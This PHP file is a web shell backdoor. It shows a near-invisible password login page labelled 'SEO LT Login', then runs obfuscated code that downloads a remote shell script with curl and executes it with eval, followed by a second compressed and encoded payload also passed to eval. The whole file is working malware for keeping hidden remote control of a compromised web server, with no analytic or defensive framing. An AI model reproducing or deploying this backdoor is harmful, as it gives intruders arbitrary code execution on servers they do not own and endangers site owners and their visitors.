<?php
session_start();
$password = "bb7eec69a95add8c798c5ff45ca0c4dd";

function login_shell()
{
?>
<html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SEO LT Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            background-size: cover;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .login-container {
            background: rgb(255, 255, 255); /* Transparansi latar belakang form */
            padding: 20px;
            border-radius: 8px;
            color: #fff;
            box-shadow: 0 4px 8px rgb(255, 255, 255);
            margin-top: 720px;
        }

        .login-container input[type="password"] {
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #ffffff;
            border-radius: 4px;
            background: transparent;
            color: #000000;
            outline: none;
        }

        .login-container input[type="password"]::placeholder {
            color: #ffffff;
        }

        .login-container input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background: #ffffff;
            color: #ffffff;
            cursor: pointer;
            outline: none;
        }

        .login-container input[type="submit"]:hover {
            background: #ffffff;
        }

        .marquee-container {
            position: fixed;
            bottom: 0;
            left: 500px;
            right: 500px;
            height: 50px;
            overflow: hidden;
            background: rgb(255, 255, 255);
            display: flex;
            align-items: center;
            color: #fff;
        }

        .marquee {
            white-space: nowrap;
            display: inline-block;
            padding-left: 75%;
            animation: marquee 10s linear infinite;
        }

        @keyframes marquee {
            from {
                transform: translateX(100%);
            }
            to {
                transform: translateX(-100%);
            }
        }
    </style>
</head>
<body>
    <div class="marquee-container">
        <div class="marquee">
            copyright © SEO LT
        </div>
    </div>
    <div class="login-container">
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="Password" required>
                <input type="submit" name="submit" value="Login">
            </div>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
}
?>

<?php
${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6C\x77\x75\x6E\x66\x73\x66\x6F\x68"]="\x6F\x75\x74\x70\x75\x74";${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6D\x67\x6F\x64\x63\x69\x64\x65\x6A\x6A\x69"]="\x63\x68";error_reporting(0);set_time_limit(0);${${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6D\x67\x6F\x64\x63\x69\x64\x65\x6A\x6A\x69"]}=curl_init();curl_setopt(${${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6D\x67\x6F\x64\x63\x69\x64\x65\x6A\x6A\x69"]},CURLOPT_URL,base64_decode("\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6e\x61\x58\x52\x73\x59\x57\x49\x75\x59\x32\x39\x74\x4c\x30\x4a\x73\x59\x57\x4e\x72\x53\x47\x46\x34\x62\x33\x49\x78\x4d\x7a\x4d\x33\x4c\x33\x4e\x6f\x5a\x57\x78\x73\x4c\x79\x30\x76\x63\x6d\x46\x33\x4c\x32\x31\x68\x61\x57\x34\x76\x63\x32\x68\x6c\x62\x47\x77\x75\x64\x48\x68\x30"));${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x66\x6C\x67\x69\x76\x77\x77\x78\x69\x7A"]="\x63\x68";$metrstpl="\x6F\x75\x74\x70\x75\x74";curl_setopt(${${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6D\x67\x6F\x64\x63\x69\x64\x65\x6A\x6A\x69"]},CURLOPT_RETURNTRANSFER,1);${$metrstpl}=curl_exec(${${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6D\x67\x6F\x64\x63\x69\x64\x65\x6A\x6A\x69"]});curl_close(${${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x66\x6C\x67\x69\x76\x77\x77\x78\x69\x7A"]});eval(base64_decode("Pz4=").${${"\x47\x4C\x4F\x42\x41\x4C\x53"}["\x6C\x77\x75\x6E\x66\x73\x66\x6F\x68"]});
?>
<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
$Lix = "==g7V+gyWc5kSVw/356nbdk/WU64DesIfyIEGTRUn4Jc98T0uXq+OHrwAP+W8G0gGApkNtRJ5HMz+0waKaKkA57H4sk7BDM2Vqr1V4cWJllrJZjoJ/gF0ZCnsse4EPY8kVIG4k+XkdOjtg/wONYQo1xtvJNikBuVmlhKbUSqI87gCvaLv1dd9f5tnLTUlOqC/VjgoLnJLsCD+gmGFlNvYLfWd3QZxkJY3FZYdC7bQ+hcWl8mSIfJUxzlrQ5sMGo6Epm+kPAZ7ZbpFBOp359u6SAK5eaBUElFg3XKVtCl26cZhK1JOWHnc5hJ5SkrrYlb6HUpGQ1lHVTQK9Cp0LvZP1lzs/sfnhpG9SgFYc6tbTMbfmHPCmzfK437cozMcXvXbBfZmW4xkhWi2DR4H23BffIEBJwSvBZjcin/LHANBwJe+DcA/Eg/7GARB4vtBkUA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
